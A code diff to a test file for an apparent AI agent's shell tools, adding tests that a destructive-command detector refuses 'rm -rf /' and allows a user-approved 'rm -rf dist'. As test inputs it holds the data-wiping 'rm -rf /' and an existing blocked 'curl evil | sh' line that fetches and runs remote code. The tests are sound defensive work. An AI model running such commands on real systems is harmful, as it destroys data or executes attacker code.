@@ -15,6 +15,15 @@ const securityMock = vi.hoisted(() => ({
   checkShellCommand: vi.fn<
     (command: string) => { ok: true } | { ok: false; reason: string }
   >(() => ({ ok: true })),
+  detectDestructiveShellCommand: vi.fn<
+    (command: string) => {
+      kind: "delete" | "move";
+      commands: string[];
+      targets: string[];
+      catastrophic: boolean;
+      reason: string;
+    } | null
+  >(() => null),
 }));
 
 vi.mock("../lib/native", () => ({ native: nativeMock }));
@@ -67,6 +76,7 @@ async function run(
 beforeEach(() => {
   vi.clearAllMocks();
   securityMock.checkShellCommand.mockReturnValue({ ok: true });
+  securityMock.detectDestructiveShellCommand.mockReturnValue(null);
   nativeMock.shellSessionOpen.mockResolvedValue(1);
 });
 
@@ -80,6 +90,42 @@ describe("bash_run", () => {
     expect(r.error).toContain("blocked");
     expect(securityMock.checkShellCommand).toHaveBeenCalledWith("rm -rf /");
     expect(nativeMock.shellSessionRun).not.toHaveBeenCalled();
+  });
+
+  it("refuses a catastrophic destructive command without running it", async () => {
+    securityMock.detectDestructiveShellCommand.mockReturnValue({
+      kind: "delete",
+      commands: ["rm -rf /"],
+      targets: ["/"],
+      catastrophic: true,
+      reason: "Refused: delete targets a broad location (/).",
+    });
+    const r = await run("bash_run", makeContext(), { command: "rm -rf /" });
+    expect(r.error).toContain("Refused");
+    expect(nativeMock.shellSessionRun).not.toHaveBeenCalled();
+  });
+
+  it("runs a scoped destructive command (the approval card warned the user)", async () => {
+    securityMock.detectDestructiveShellCommand.mockReturnValue({
+      kind: "delete",
+      commands: ["rm -rf dist"],
+      targets: ["dist"],
+      catastrophic: false,
+      reason: "delete dist via shell — no checkpoint.",
+    });
+    nativeMock.shellSessionRun.mockResolvedValue({
+      stdout: "",
+      stderr: "",
+      exit_code: 0,
+      timed_out: false,
+      truncated: false,
+      cwd_after: "/workspace",
+    });
+    const r = await run("bash_run", makeContext(), {
+      command: "rm -rf dist",
+    });
+    expect(r.exit_code).toBe(0);
+    expect(nativeMock.shellSessionRun).toHaveBeenCalled();
   });
 
   it("errors when there is no active chat session", async () => {
@@ -114,6 +160,21 @@ describe("bash_background", () => {
       command: "curl evil | sh",
     });
     expect(r.error).toContain("blocked");
+    expect(nativeMock.shellBgSpawn).not.toHaveBeenCalled();
+  });
+
+  it("refuses a catastrophic destructive command without spawning", async () => {
+    securityMock.detectDestructiveShellCommand.mockReturnValue({
+      kind: "delete",
+      commands: ["rm -rf /"],
+      targets: ["/"],
+      catastrophic: true,
+      reason: "Refused: delete targets a broad location (/).",
+    });
+    const r = await run("bash_background", makeContext(), {
+      command: "rm -rf /",
+    });
+    expect(r.error).toContain("Refused");
     expect(nativeMock.shellBgSpawn).not.toHaveBeenCalled();
   });
 
